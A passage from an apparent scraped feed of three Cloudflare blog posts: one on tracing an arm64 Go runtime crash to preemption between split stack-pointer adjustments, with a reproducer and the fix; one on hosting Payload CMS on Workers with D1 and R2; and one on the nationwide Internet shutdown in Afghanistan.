a Go runtime bug. However, upon seeing that both issues implicated the same function, we felt more skeptical – notably the Go Netlink library uses unsafe.Pointer so memory corruption was a plausible explanation even if we didn't understand why.After an unsuccessful code audit we had hit a wall. The crashes were rare and remote from the root cause. Maybe these crashes were caused by a runtime bug, maybe they were caused by a Go Netlink bug. It seemed clear that there was something wrong with this area of the code, but code auditing wasn’t going anywhere. Breakthrough At this point we had a fairly good understanding of what was crashing but very little understanding of why it was happening. It was clear that the root cause of the stack unwinder crashing was remote from the actual crash, and that it had to do with (*NetlinkSocket).Receive, but why? We were able to capture a coredump of a production crash and view it in a debugger. The backtrace confirmed what we already knew – that there was a segmentation fault when unwinding a stack. The crux of the issue revealed itself when we looked at the goroutine which had been preempted while calling (*NetlinkSocket).Receive. (dlv) bt 0 0x0000555577579dec in runtime.asyncPreempt2 at /usr/local/go/src/runtime/preempt.go:306 1 0x00005555775bc94c in runtime.asyncPreempt at /usr/local/go/src/runtime/preempt_arm64.s:47 2 0x0000555577cb2880 in github.com/vishvananda/netlink/nl.(*NetlinkSocket).Receive at /vendor/github.com/vishvananda/netlink/nl/nl_linux.go:779 3 0x0000555577cb19a8 in github.com/vishvananda/netlink/nl.(*NetlinkRequest).Execute at /vendor/github.com/vishvananda/netlink/nl/nl_linux.go:532 4 0x0000555577551124 in runtime.heapSetType at /usr/local/go/src/runtime/mbitmap.go:714 5 0x0000555577551124 in runtime.heapSetType at /usr/local/go/src/runtime/mbitmap.go:714 ... (dlv) disass -a 0x555577cb2878 0x555577cb2888 TEXT github.com/vishvananda/netlink/nl.(*NetlinkSocket).Receive(SB) /vendor/github.com/vishvananda/netlink/nl/nl_linux.go nl_linux.go:779 0x555577cb2878 fdfb7fa9 LDP -8(RSP), (R29, R30) nl_linux.go:779 0x555577cb287c ff430191 ADD $80, RSP, RSP nl_linux.go:779 0x555577cb2880 ff434091 ADD $(16<<12), RSP, RSP nl_linux.go:779 0x555577cb2884 c0035fd6 RET The goroutine was paused between two opcodes in the function epilogue. Since the process of unwinding a stack relies on the stack frame being in a consistent state, it felt immediately suspicious that we preempted in the middle of adjusting the stack pointer. The goroutine had been paused at 0x555577cb2880, between ADD $80, RSP, RSP and ADD $(16<<12), RSP, RSP. We queried the service logs to confirm our theory. This wasn’t isolated – the majority of stack traces showed that this same opcode was preempted. This was no longer a weird production crash we couldn’t reproduce. A crash happened when the Go runtime preempted between these two stack pointer adjustments. We had our smoking gun. Building a minimal reproducer At this point we felt pretty confident that this was actually just a runtime bug and it should be reproducible in an isolated environment without any dependencies. The theory at this point was:Stack unwinding is triggered by garbage collectionAsync preemption between a split stack pointer adjustment causes a crashWhat if we make a function which splits the adjustment and then call it in a loop? package main import ( \"runtime\" ) //go:noinline func big_stack(val int) int { var big_buffer = make([]byte, 1 << 16) sum := 0 // prevent the compiler from optimizing out the stack for i := 0; i < (1<<16); i++ { big_buffer[i] = byte(val) } for i := 0; i < (1<<16); i++ { sum ^= int(big_buffer[i]) } return sum } func main() { go func() { for { runtime.GC() } }() for { _ = big_stack(1000) } } This function ends up with a stack frame slightly larger than can be represented in 16 bits, and so on arm64 the Go compiler will split the stack pointer adjustment into two opcodes. If the runtime preempts between these opcodes then the stack unwinder will read an invalid stack pointer and crash. ; epilogue for main.big_stack ADD $8, RSP, R29 ADD $(16<<12), R29, R29 ADD $16, RSP, RSP ; preemption is problematic between these opcodes ADD $(16<<12), RSP, RSP RET After running this for a few minutes the program panicked as expected! SIGSEGV: segmentation violation PC=0x60598 m=8 sigcode=1 addr=0x118 goroutine 0 gp=0x400019c540 m=8 mp=0x4000198708 [idle]: runtime.(*unwinder).next(0x400030fd10) /home/thea/sdk/go1.23.4/src/runtime/traceback.go:458 +0x188 fp=0x400030fcc0 sp=0x400030fc30 pc=0x60598 runtime.scanstack(0x40000021c0, 0x400002f750) /home/thea/sdk/go1.23.4/src/runtime/mgcmark.go:887 +0x290 [...] goroutine 1 gp=0x40000021c0 m=nil [runnable (scan)]: runtime.asyncPreempt2() /home/thea/sdk/go1.23.4/src/runtime/preempt.go:308 +0x3c fp=0x40003bfcf0 sp=0x40003bfcd0 pc=0x400cc runtime.asyncPreempt() /home/thea/sdk/go1.23.4/src/runtime/preempt_arm64.s:47 +0x9c fp=0x40003bfee0 sp=0x40003bfcf0 pc=0x75aec main.big_stack(0x40003cff38?) /home/thea/dev/stack_corruption_reproducer/main.go:29 +0x94 fp=0x40003cff00 sp=0x40003bfef0 pc=0x77c04 Segmentation fault (core dumped) real 1m29.165s user 4m4.987s sys 0m43.212s A reproducible crash with standard library only? This felt like conclusive evidence that our problem was a runtime bug.This was an extremely particular reproducer! Even now with a good understanding of the bug and its fix, some of the behavior is still puzzling. It's a one-instruction race condition, so it’s unsurprising that small changes could have large impact. For example, this reproducer was originally written and tested on Go 1.23.4, but did not crash when compiled with 1.23.9 (the version in production), even though we could objdump the binary and see the split ADD still present! We don’t have a definite explanation for this behavior – even with the bug present there remain a few unknown variables which affect the likelihood of hitting the race condition. A single-instruction race condition window arm64 is a fixed-length 4-byte instruction set architecture. This has a lot of implications on codegen but most relevant to this bug is the fact that immediate length is limited. add gets a 12-bit immediate, mov gets a 16-bit immediate, etc. How does the architecture handle this when the operands don't fit? It depends – ADD in particular reserves a bit for \"shift left by 12\" so any 24 bit addition can be decomposed into two opcodes. Other instructions are decomposed similarly, or just require loading an immediate into a register first. The very last step of the Go compiler before emitting machine code involves transforming the program into obj.Prog structs. It's a very low level intermediate representation (IR) that mostly serves to be translated into machine code. //https://github.com/golang/go/blob/fa2bb342d7b0024440d996c2d6d6778b7a5e0247/src/cmd/internal/obj/arm64/obj7.go#L856 // Pop stack frame. // ADD $framesize, RSP, RSP p = obj.Appendp(p, c.newprog) p.As = AADD p.From.Type = obj.TYPE_CONST p.From.Offset = int64(c.autosize) p.To.Type = obj.TYPE_REG p.To.Reg = REGSP p.Spadj = -c.autosize Notably, this IR is not aware of immediate length limitations. Instead, this happens in asm7.go when Go's internal intermediate representation is translated into arm64 machine code. The assembler will classify an immediate in conclass based on bit size and then use that when emitting instructions – extra if needed.The Go assembler uses a combination of (mov, add) opcodes for some adds that fit in 16-bit immediates, and prefers (add, add + lsl 12) opcodes for 16-bit+ immediates. Compare a stack of (slightly larger than) 1<<15: ; //go:noinline ; func big_stack() byte { ; var big_stack = make([]byte, 1<<15) ; return big_stack[0] ; } MOVD $32776, R27 ADD R27, RSP, R29 MOVD $32784, R27 ADD R27, RSP, RSP RET With a stack of 1<<16: ; //go:noinline ; func big_stack() byte { ; var big_stack = make([]byte, 1<<16) ; return big_stack[0] ; } ADD $8, RSP, R29 ADD $(16<<12), R29, R29 ADD $16, RSP, RSP ADD $(16<<12), RSP, RSP RET In the larger stack case, there is a point between ADD x, RSP, RSP opcodes where the stack pointer is not pointing to the tip of a stack frame. We thought at first that this was a matter of memory corruption – that in handling async preemption the runtime would push a function call on the stack and corrupt the middle of the stack. However, this goroutine is already in the function epilogue – any data we corrupt is actively in the process of being thrown away. What's the issue then? The Go runtime often needs to unwind the stack, which means walking backwards through the chain of function calls. For example: garbage collection uses it to find live references on the stack, panicking relies on it to evaluate defer functions, and generating stack traces needs to print the call stack. For this to work the stack pointer must be accurate during unwinding because of how golang dereferences sp to determine the calling function. If the stack pointer is partially modified, the unwinder will look for the calling function in the middle of the stack. The underlying data is meaningless when interpreted as directions to a parent stack frame and then the runtime will likely crash. //https://github.com/golang/go/blob/66536242fce34787230c42078a7bbd373ef8dcb0/src/runtime/traceback.go#L373 if innermost && frame.sp < frame.fp || frame.lr == 0 { lrPtr = frame.sp frame.lr = *(*uintptr)(unsafe.Pointer(lrPtr)) } When async preemption happens it will push a function call onto the stack but the parent stack frame is no longer correct because sp was only partially adjusted when the preemption happened. The crash flow looks something like this: Async preemption happens between the two opcodes that add x, rsp expands toGarbage collection triggers stack unwinding (to check for heap object liveness)The unwinder starts traversing the stack of the problematic goroutine and correctly unwinds up to the problematic functionThe unwinder dereferences sp to determine the parent functionAlmost certainly the data behind sp is not a functionCrash We saw earlier a faulting stack trace which ended in (*NetlinkSocket).Receive – in this case stack unwinding faulted while it was trying to determine the parent frame. goroutine 90 gp=0x40042cc000 m=nil [preempted (scan)]: runtime.asyncPreempt2() /usr/local/go/src/runtime/preempt.go:306 +0x2c fp=0x40060a25d0 sp=0x40060a25b0 pc=0x55557e299dec runtime.asyncPreempt() /usr/local/go/src/runtime/preempt_arm64.s:47 +0x9c fp=0x40060a27c0 sp=0x40060a25d0 pc=0x55557e2dc94c github.com/vishvananda/netlink/nl.(*NetlinkSocket).Receive(0xff48ce6e060b2848?) /vendor/github.com/vishvananda/netlink/nl/nl_linux.go:779 +0x130 fp=0x40060b2820 sp=0x40060a27d0 pc=0x55557e9d2880 Once we discovered the root cause we reported it with a reproducer and the bug was quickly fixed. This bug is fixed in go1.23.12, go1.24.6, and go1.25.0. Previously, the go compiler emitted a single add x, rsp instruction and relied on the assembler to split immediates into multiple opcodes as necessary. After this change, stacks larger than 1<<12 will build the offset in a temporary register and then add that to rsp in a single, indivisible opcode. A goroutine can be preempted before or after the stack pointer modification, but never during. This means that the stack pointer is always valid and there is no race condition. LDP -8(RSP), (R29, R30) MOVD $32, R27 MOVK $(1<<16), R27 ADD R27, RSP, RSP RET This was a very fun problem to debug. We don’t often see bugs where you can accurately blame the compiler. Debugging it took weeks and we had to learn about areas of the Go runtime that people don’t usually need to think about. It’s a nice example of a rare race condition, the sort of bug that can only really be quantified at a large scale.We’re always looking for people who enjoy this kind of detective work. Our engineering teams are hiring. Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Deep DiveGoProgramming\nOctober 16, 2025 2:00 PMImproving the trustworthiness of Javascript on the WebThere's no way to audit a site’s client-side code as it changes, making it hard to trust sites that use cryptography. We preview a specification we co-authored that adds auditability to the web....By Michael RosenbergSecurity, Malicious JavaScript, JavaScript, Deep Dive, Cryptography, Research\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 25, 2025 2:00 PMR2 SQL: a deep dive into our new distributed query engineR2 SQL provides a built-in, serverless way to run ad-hoc analytic queries against your R2 Data Catalog. This post dives deep under the Iceberg into how we built this distributed engine....By Yevgen Safronov, Nikita Lapkov, Jérôme SchneiderR2, Birthday Week, Data, Deep Dive, Edge Computing, Rust, Serverless, SQL\nJuly 23, 2025 2:00 PMBuilding Jetflow: a framework for flexible, performant data pipelines at CloudflareFaced with a data-ingestion challenge at a massive scale, Cloudflare's Business Intelligence team built a new framework called Jetflow....By Harry Hough, Rebecca Walton-Jones , Andy Fan, Ricardo Margalhau, Uday SharmaData, Go, Performance, Design, Engineering", "timestamp": "2025-10-21T13:33:34.190016"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Payload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stack", "url": "https://blog.cloudflare.com/payload-cms-workers/", "published": "Tue, 30 Sep 2025 15:50:00 GMT", "content": "Payload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stack2025-09-30Jason KincaidRicardo Tavares6 min readThis post is also available in 日本語.Tucked behind the administrator login screen of countless websites is one of the Internet’s unsung heroes: the Content Management System (CMS). This seemingly basic piece of software is used to draft and publish blog posts, organize media assets, manage user profiles, and perform countless other tasks across a dizzying array of use cases. One standout in this category is a vibrant open-source project called Payload, which has over 35,000 stars on GitHub and has generated so much community excitement that it was recently acquired by Figma.Today we’re excited to showcase a new template from the Payload team, which makes it possible to deploy a full-fledged CMS to Cloudflare’s platform in a single click: just click the Deploy to Cloudflare button to generate a fully-configured Payload instance, complete with bindings to Cloudflare D1 and R2. Below we’ll dig into the technical work that enables this, some of the opportunities it unlocks, and how we’re using Payload to help power Cloudflare TV. But first, a look at why hosting a CMS on Workers is such a game changer. Behind the scenes: Cloudflare TV’s Payload instance Serverless by design Most CMSs are designed to be hosted on a conventional server that runs 24/7. That means you need to provision hardware or virtual machines, install the CMS software and dependencies, manage ports and firewalls, and navigate ongoing maintenance and scaling hurdles.This presents significant operational overhead, and can be costly if your server needs to handle high volumes (or spiky peaks) of traffic. What’s worse, you’re paying for that server whether you have any active users or not. One of the superpowers of Cloudflare Workers is that your application and data are accessible 24/7, without needing a server running all the time. When people use your application, it spins up at the closest Cloudflare server, ready to go. When your users are asleep, the Worker spins down, and you don’t pay for compute you aren’t using. With Payload running on Workers, you get the best of conventional CMSs — fully configurable asset management, custom webhooks, a library of community plugins, version history — all in a serverless form factor. We’ve been piloting the Payload-on-Workers template with an instance of our 24/7 video platform Cloudflare TV, which we use as a test bed for new technologies. Migrating from a conventional CMS was painless, thanks to its support for common features like conditional logic and an extensive set of components for building out our admin dashboard. Our content library has over 2,000 episodes and 70,000 assets, and Payload’s filtering and search features help us navigate them with ease. It is worth reiterating just how many use cases CMSs can fulfill, from publishing to ecommerce to bespoke application dashboards whipped up by Claude Code or Codex. CMSs provide the sort of interface that less-technical users can pick up intuitively, and can be molded into whatever shape best fits the project. We’re excited to see what people get to building. OpenNext opens doors Payload first launched in 2022 as a Node/Express.js application and quickly began building steam. In 2024, it introduced native support for the popular Next.js framework, which helped pave the way for today’s announcement: this year, Cloudflare became the best place to host your applications built on Next.js, with the GA release of our OpenNext adapter.Thanks to this adapter, porting Payload to OpenNext was relatively straightforward using the official OpenNext Get Started guide. Because we wanted the application to run seamlessly on Workers, with all the benefits of Workers Bindings, we set out to ensure support for Cloudflare’s database and storage products. Database For our initial approach, we began by connecting Payload to an external Postgres database, using the official @payloadcms/db-postgres adapter. Thanks to Workers support for the node-postgres package, everything worked pretty much straight away. As connections cannot be shared across requests, we just had to disable connection pooling: import { buildConfig } from 'payload' import { postgresAdapter } from '@payloadcms/db-postgres' export default buildConfig({ … db: postgresAdapter({ pool: { connectionString: process.env.DATABASE_URI, maxUses: 1, }, }), … }); Of course, disabling connection pooling increases the overall latency, as each request needs to first establish a new connection with the database. To address this, we put Hyperdrive in front of it, which not only maintains a pool of connections across the Cloudflare network, by setting up a tunnel to the database server, but also adds a query cache, significantly improving the performance. import { buildConfig } from 'payload' import { postgresAdapter } from '@payloadcms/db-postgres' import { getCloudflareContext } from '@opennextjs/cloudflare'; const cloudflare = await getCloudflareContext({ async: true }); export default buildConfig({ … db: postgresAdapter({ pool: { connectionString: cloudflare.env.HYPERDRIVE.connectionString, maxUses: 1, }, }), … }); Database with D1 With Postgres working, we next sought to add support for D1, Cloudflare’s managed serverless database, built on top of SQLite.Payload doesn’t support D1 out of the box, but has support for SQLite via the @payloadcms/db-sqlite adapter, which uses Drizzle ORM alongside libSQL. Thankfully, Drizzle also has support for D1, so we decided to build a custom adapter for D1, using the SQLite one as a base.The main difference between D1 and libSQL is on the result object, so we built a small method to map the result from D1 into the format expected by libSQL: export const execute: Execute<any> = function execute({ db, drizzle, raw, sql: statement }) { const executeFrom = (db ?? drizzle)! const mapToLibSql = (query: SQLiteRaw<D1Result<unknown>>) => { const execute = query.execute query.execute = async () => { const result: D1Result = await execute() const resultLibSQL: Omit<ResultSet, 'toJSON'> = { columns: undefined, columnTypes: undefined, lastInsertRowid: BigInt(result.meta.last_row_id), rows: result.results as any[], rowsAffected: result.meta.rows_written, } return Object.assign(result, resultLibSQL) } return query } if (raw) { const result = mapToLibSql(executeFrom.run(sql.raw(raw))) return result } else { const result = mapToLibSql(executeFrom.run(statement!)) return result } } Other than that, it was just a matter of passing the D1 binding directly into Drizzle’s constructor in order to get it working.For applying database migrations during deployment, we used the newly released remote bindings feature of Wrangler to connect to the remote database, using the same binding. This way we didn’t need to configure any API tokens to be able to interact with the database. Media storage with R2 Payload provides an official S3 storage adapter, via the @payloadcms/storage-s3 package. R2 is S3-compatible, which means we could have used the official adapter, but similar to the database, we wanted to use the R2 binding instead of having to create API tokens.Therefore, we decided to also build a custom storage adapter for R2. This one was pretty straightforward, as the binding already handles most of the work: import type { Adapter } from '@payloadcms/plugin-cloud-storage/types' import path from 'path' const isMiniflare = process.env.NODE_ENV === 'development'; export const r2Storage: (bucket: R2Bucket) => Adapter = (bucket) => ({ prefix = '' }) => { const key = (filename: string) => path.posix.join(prefix, filename) return { name: 'r2', handleDelete: ({ filename }) => bucket.delete(key(filename)), handleUpload: async ({ file }) => { // Read more: https://github.com/cloudflare/workers-sdk/issues/6047#issuecomment-2691217843 const buffer = isMiniflare ? new Blob([file.buffer]) : file.buffer await bucket.put(key(file.filename), buffer) }, staticHandler: async (req, { params }) => { // Due to https://github.com/cloudflare/workers-sdk/issues/6047 // We cannot send a Headers instance to Miniflare const obj = await bucket?.get(key(params.filename), { range: isMiniflare ? undefined : req.headers }) if (obj?.body == undefined) return new Response(null, { status: 404 }) const headers = new Headers() if (!isMiniflare) obj.writeHttpMetadata(headers) return obj.etag === (req.headers.get('etag') || req.headers.get('if-none-match')) ? new Response(null, { headers, status: 304 }) : new Response(obj.body, { headers, status: 200 }) }, } } Deployment With the database and storage adapters in place, we were able to successfully launch an instance of Payload, running completely on Cloudflare’s Developer Platform.The blank template consists of a simple database with just two tables, one for media and another for the users. In this template it’s possible to sign up, create new users and upload media files. Then, it’s quite easy to expand with additional collections, relationships and custom fields, by modifying Payload’s configuration. Performance optimization with Read Replicas By default, D1 is placed in a single location, customizable via a location hint. As Payload is deployed as a Worker, requests may be coming from any part of the world and so latency will be all over the place when connecting to the database.To solve this, we can make use of D1’s global read replication, which deploys multiple read-only replicas across the globe. To select the correct replica and ensure sequential consistency, D1 uses sessions, with a bookmark that needs to be passed around.Drizzle doesn’t support D1 sessions yet, but we can still use the “first-primary” type of session, in which the first query will always hit the primary instance and subsequent queries may hit one of the replicas. Updating the adapter to use replicas is just a matter of updating the Drizzle initialization to pass the D1 session directly: this.drizzle = drizzle(this.binding.withSession(\"first-primary\"), { logger, schema: this.schema }); After this simple change, we saw immediate latency improvements, with the P50 wall-time for requests from across the globe reduced by 60% when connecting to a database located in Eastern North America. Read replicas, as the name implies, only affect read-only queries, so any write operations will always be forwarded to the primary instance, but for our use case, reads are most of the traffic. No read replicasRead replicas enabledImprovementP50300ms120ms-60%P90480ms250ms-48%P99760ms550ms-28%Wall time for requests to the Payload worker, each involving two database calls, as reported by Cloudflare Dash. Load was generated via 4 globally distributed uptime checks making a request every 60s to 4 distinct URLs.Because we’ll be relying on Payload for managing Cloudflare TV’s enormous content library, we’re well positioned to test it at scale, and will continue to submit PRs with optimizations and improvements as they arise. The right tool for the job The potential use cases for CMSs are limitless, which is all the more reason it’s a good thing to have choices. We opted for Payload because of its extensive library of components, mature feature set, and large community — but it’s not the only Workers-compatible CMS in town.Another exciting project is SonicJs (Docs), which is built from the ground up on Workers, D1, and Astro, promising blazing speeds and a malleable foundation. SonicJs is working on a version that’s well suited for collaborating with agentic AI assistants like Claude and Codex, and we’re excited to see how that develops. For lightweight use cases, microfeed is a self-hosted CMS on Cloudflare designed for managing podcasts, blogs, photos, and more.These are each headless CMSs, which means you choose the frontend for your application. Don’t miss our recent announcement around sponsoring the powerful frameworks Astro and Tanstack, and find our complete guides to using these frameworks and others, including React + Vite, in the Workers Docs.To get started using Payload right now, click the Deploy to Cloudflare button below, which will generate a fully functional Payload instance, including a D1 database and R2 bucket automatically bound to your worker. Find the README and more details in Payload’s template repository.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Cloudflare Workers\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 1:00 PMEliminating Cold Starts 2: shard and conquerWe reduced Cloudflare Workers cold starts by 10x by optimistically routing to servers with already-loaded Workers. Learn how we did it here....By Harris HancockBirthday Week, Cap'n Proto, Cloudflare Workers, Engineering, TLS\nSeptember 26, 2025 1:00 PMCode Mode: the better way to use MCPIt turns out we've all been using MCP wrong. Most agents today use MCP by exposing the \"tools\" directly to the LLM....By Kenton Varda, Sunil PaiAI, Birthday Week, Cloudflare Workers, Agents, MCP", "timestamp": "2025-10-21T13:33:34.998612"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Nationwide Internet shutdown in Afghanistan extends localized disruptions", "url": "https://blog.cloudflare.com/nationwide-internet-shutdown-in-afghanistan/", "published": "Tue, 30 Sep 2025 10:05:00 GMT", "content": "Nationwide Internet shutdown in Afghanistan extends localized disruptions2025-09-30David Belson1 min readJust after 11:30 UTC (16:00 local time) on Monday, September 29, 2025, subscribers of wired Internet providers in Afghanistan experienced a brief service interruption, lasting until just before 12:00 UTC (16:30 local time). Cloudflare traffic data for AS38472 (Afghan Wireless) and AS131284 (Etisalat) shows that traffic from these mobile providers remained available during that period.However, just after 12:30 UTC (17:00 local time), the Internet was completely shut down, with Afghani news outlet TOLOnews initially reporting in a post on X that “Sources have confirmed to TOLOnews that today (Monday), afternoon, fiber-optic Internet will be shut down across the country.” This shutdown is likely an extension of the regional shutdowns of fiber optic connections that took place earlier in September, and it will reportedly remain in force “until further notice”. (The earlier regional shutdowns are discussed in more detail below.)While Monday’s first shutdown was only partial, with mobile connectivity apparently remaining available, the graphs below show that the second event took the country completely offline, with web and DNS traffic dropping to zero at a national level, as seen in the graphs below.While the shutdown will impact subscribers to fixed and mobile Internet services, it also “threatens to paralyze critical services including banking, customs operations and emergency communications” across the country. The X post from TOLOnews also noted that television and radio networks would face disruptions.HTTP request traffic is traffic coming from web browsers, applications, and automated tools, and is a clear signal of the availability of Internet connectivity. The graph below shows this request volume dropping sharply as the shutdown was implemented. HTTP request traffic from Afghanistan, September 29, 2025Cloudflare sends bytes back in response to those HTTP requests (“HTTP bytes”), as well as sending bytes back in response to traffic associated with other services, such as our 1.1.1.1 DNS resolver, authoritative DNS, WARP, etc. (“total bytes”). Cloudflare stopped receiving client traffic from the services when the shutdown began, causing the bytes transferred in response to drop to zero. Internet traffic from Afghanistan, September 29, 20251.1.1.1 is Cloudflare’s privacy-focused DNS resolver, and processes DNS lookup requests from clients. As connectivity was cut, traffic to the service disappeared. DNS query traffic to Cloudflare’s 1.1.1.1 resolver from Afghanistan, September 29, 2025At a regional level, it appears that traffic from Kabul fell slightly later than traffic from the other regions, trailing them by approximately a half hour. HTTP request traffic from the top five provinces in Afghanistan, September 29, 2025The delay in traffic loss seen in Kabul may be associated with a more gradual loss of traffic seen at AS38742 (Afghan Wireless), which saw traffic approach zero just after 13:00 UTC (17:30 local time). This conjecture is supported by a published report that noted “Residents across Kabul and several provincial cities reported on Monday that fiber-optic services were no longer available, with only limited mobile data functioning briefly before signal towers stopped working altogether.”Interestingly, it appears that as of 00:00 UTC (04:30 local time) on September 30, we continue to see a very small amount of traffic from this network. (This is in contrast to other networks, whose lines disappeared from the graph around 12:30 UTC (17:00 local time)). HTTP request traffic from the top 10 ASNs in Afghanistan, September 29, 2025Network providers announce IP address space that they are responsible for to other networks, enabling the routing of traffic to and from those IP addresses. When these announcements are withdrawn, the resources in that address space, whether clients or servers, can no longer reach, or are no longer reachable from, the rest of the Internet.In Afghanistan, announced IPv4 address space dropped rapidly as the shutdown was implemented, falling by two-thirds from 604 to 197 announced /24s (blocks of 256 IPv4 addresses) in the first 20 minutes, and then dropping further over the next 90 minutes. Through the end of the day, several networks continued to announce a small amount of IPv4 address space: four /24s from AS38742 (Afghan Wireless), two from AS149024 (Afghan Bawar ICT Services), and one each from AS138322 (Afghan Wireless) and AS136479 (Cyber Telecom).Afghan Wireless is a mobile connectivity provider, and Afghan Bawar and Cyber Telecom appear to offer wireless/mobile services as well. The prefixes still visible from Afghan Wireless appear to be routed through AS17557 (Pakistan Telecom), while the prefixes from the other two providers (Afghan Bawar, Cyber Telecom) appear to be routed through AS40676 (Psychz Networks), a US-based solutions provider. Announced IPv4 address space from Afghanistan, September 29, 2025Announced IPv6 address space fell as well, though not quite as catastrophically, dropping by three-fourths almost immediately, from 262,407 /48s (blocks of over 1.2 septillion IPv6 addresses) to 65,542. Announced IPv6 address space from Afghanistan, September 29, 2025 Regional shutdowns by the Taliban to prevent “immoral activities” In mid-September, the Taliban ordered the shutdown of fiber optic Internet connectivity in multiple provinces across Afghanistan, as part of a drive to “prevent immorality”. It was the first such ban issued since the Taliban took full control of the country in August 2021.These regional shutdowns blocked Afghani students from attending online classes, impacted commerce and banking, and limited access to government agencies and institutions such as passport and registration offices, customs offices. As many as 15 provinces experienced shutdowns, and we review the observed impacts across several of them below, using the regional traffic data recently made available on Cloudflare Radar.Balkh appeared to be one of the earliest targeted provinces, with traffic dropping midday (UTC) on September 15. While some nominal recovery occurred on September 23, traffic remained well below pre-shutdown levels. Internet traffic from Balkh, Afghanistan, September 1-28, 2025After several days of peak traffic levels double those seen in previous weeks, traffic in Takhar fell on September 16, remaining near zero until September 21, when a small amount of connectivity was apparently restored. Internet traffic from Takhar, Afghanistan, September 1-28, 2025In Kandahar, lower peak traffic volumes are visible between September 17 and September 21. The partial restoration of traffic is coincident with the restoration of Internet services highlighted in a published report, though it notes that “The restoration of services is limited to point-to-point connections for key government offices, including banks, customs offices, and the Directorate for National ID Cards.” Internet traffic from Kandahar, Afghanistan, September 1-28, 2025Baghlan experienced an anomalous spike in traffic on September 16, with total traffic spiking 3x higher than peaks seen during the previous weeks. However, on September 17, traffic dropped to a fraction of pre-shutdown levels. Except for a return to near-normal levels on September 21 & 22, the disruption remained in place through the end of the month. Internet traffic from Baghlan, Afghanistan, September 1-28, 2025Traffic in Nangarhar was disrupted between September 19-22, but quickly recovered to pre-shutdown levels once restored. Internet traffic from Nangarhar, Afghanistan, September 1-28, 2025After experiencing an apparent issue at the start of the month, Internet traffic in Oruzgan, again fell on September 19. After an apparent complete shutdown, on September 23, a small amount of traffic was again visible. Internet traffic from Oruzgan, Afghanistan, September 1-28, 2025Internet connectivity was also disrupted in the province of Herat, although differently. From September 22-25, partial Internet outages were implemented between 16:30-03:30 UTC (21:00-08:00 local time), with traffic volumes dropping to approximately half of those seen at the same time the prior weeks. The intent of these “Internet curfew” shutdowns is unclear, but Herat residents noted that they “severely disrupted their business and educational activities”. Internet traffic from Herat, Afghanistan, September 16-29, 2025While Internet shutdowns remain all too common around the world, most (though not all) are comparatively short-lived, and are generally in response to a local event, such as exams, unrest/riots, elections, etc. Given the broad impact of this shutdown across all facets of daily personal, social, and professional life in Afghanistan, analysts state that it \"could deepen Afghanistan’s digital isolation, further damage its struggling economy and drive more Afghans out of work at a time when humanitarian needs are already severe.\" Where can I learn more? You can follow the latest state of Internet connectivity in Afghanistan on Cloudflare Radar. The Cloudflare Radar team will continue to monitor traffic from Afghanistan as well, sharing our observations on the Cloudflare Radar Outage Center, via social media, and in posts on blog.cloudflare.com. Follow us on social media at @CloudflareRadar (X), noc.social/@cloudflareradar (Mastodon), and radar.cloudflare.com (Bluesky), or contact us via email.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. RadarInternet ShutdownInternet TrafficOutage\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 1:00 PMIntroducing new regional Internet traffic and Certificate Transparency insights on Cloudflare RadarCloudflare Radar now offers a Certificate Transparency dashboard for monitoring TLS certificate activity, and new regional traffic insights for a sub-national perspective on Internet trends....By David Belson, André Jesus, Luke ValentaBirthday Week, Radar, Internet Traffic, Mobile, Certificate Transparency\nSeptember 13, 2025 7:19 AMA deep dive into Cloudflare’s September 12, 2025 dashboard and API outageCloudflare’s Dashboard and a set of related APIs were unavailable or partially available for an hour starting on Sep 12, 17:57 UTC. The outage did not affect the serving of cached files via the ...By Tom Lianza, Joaquin MadrugaOutage, Post Mortem\nAugust 29, 2025 2:00 PMThe crawl-to-click gap: Cloudflare data on AI bots, training, and referralsBy mid-2025, training drives nearly 80% of AI crawling, while referrals to publishers (especially from Google) are falling and crawl-to-refer ratios show AI consumes far more than it sends back....By João ToméAI Week, AI, Radar, Internet Trends, Traffic, Bots", "timestamp": "2025-10-21T13:33:35.867942"}
